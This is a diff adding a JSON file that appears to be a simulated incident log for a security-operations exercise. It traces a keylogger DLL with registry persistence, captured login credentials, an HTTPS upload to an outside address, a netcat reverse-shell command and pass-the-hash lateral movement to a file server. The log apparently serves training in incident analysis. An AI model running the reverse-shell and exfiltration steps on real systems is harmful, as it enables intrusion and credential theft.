@@ -1,0 +1,96 @@
+{
+  "malware_sample": "nosoyvirus.dll",
+  "initial_execution": {
+    "timestamp": "2025-09-24 09:10:32",
+    "process_created": "C:\\Users\\Public\\svchost.exe -load nosoyvirus.dll",
+    "parent_process": "explorer.exe",
+    "persistence": "registry_run_key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\nosoyvirus"
+  },
+  "keylogger_activity": [
+    {
+      "timestamp": "2025-09-24 09:12:43",
+      "focused_window": "https://soc.grupo4.local/login"
+    },
+    {
+      "timestamp": "2025-09-24 09:12:45",
+      "keystrokes": "admin.grupo4"
+    },
+    {
+      "timestamp": "2025-09-24 09:12:52",
+      "keystrokes": "M1P@ssw0rdSocGrupo4"
+    },
+    {
+      "timestamp": "2025-09-24 09:12:53",
+      "action": "submit_login"
+    }
+  ],
+  "exfiltration": [
+    {
+      "timestamp": "2025-09-24 10:02:11",
+      "system_event": "scheduled upload triggered"
+    },
+    {
+      "timestamp": "2025-09-24 10:02:12",
+      "exfiltration_record": "logs.dat -> POST to 198.51.100.23:443",
+      "protocol": "HTTPS",
+      "bytes": 20480,
+      "status": "200 OK (simulado)"
+    }
+  ],
+  "reverse_shell": {
+    "timestamp": "2025-09-24 10:05:30",
+    "command_executed": "nc -e /bin/sh 192.168.1.100 4444",
+    "connection_status": "active",
+    "remote_host": "192.168.1.100",
+    "remote_port": 4444
+  },
+  "lateral_movement": [
+    {
+      "timestamp": "2025-09-24 10:07:12",
+      "technique": "Pass-the-Hash",
+      "source_host": "WS-EMPLEADO01",
+      "target_host": "FILESERV-02",
+      "used_credentials": {
+        "username": "admin.grupo4",
+        "password": "M1P@ssw0rdSocGrupo4"
+      },
+      "status": "login_success"
+    },
+    {
+      "timestamp": "2025-09-24 10:09:44",
+      "action": "Enumerated shared folders on FILESERV-02",
+      "shares_found": [
+        "\\\\FILESERV-02\\Documentos",
+        "\\\\FILESERV-02\\Proyectos",
+        "\\\\FILESERV-02\\Backups"
+      ]
+    },
+    {
+      "timestamp": "2025-09-24 10:11:02",
+      "action": "Accessed file",
+      "file_path": "\\\\FILESERV-02\\Proyectos\\Plan_Estrategico_2026.xlsx",
+      "bytes_read": 58231
+    }
+  ],
+  "network_activity": [
+    {
+      "timestamp": "2025-09-24 10:12:22",
+      "connection": "WS-EMPLEADO01 -> 198.51.100.23:443",
+      "data_sent": "Credentials and enumerated files metadata"
+    },
+    {
+      "timestamp": "2025-09-24 10:13:11",
+      "connection": "WS-EMPLEADO01 -> 192.168.1.100:4444",
+      "data_sent": "Interactive shell session ongoing"
+    }
+  ],
+  "impact": {
+    "note": "desvio de informacion inminente",
+    "risk": "High",
+    "compromised_assets": [
+      "Cuenta admin.grupo4",
+      "Servidor FILESERV-02",
+      "Documentos confidenciales"
+    ]
+  }
+}
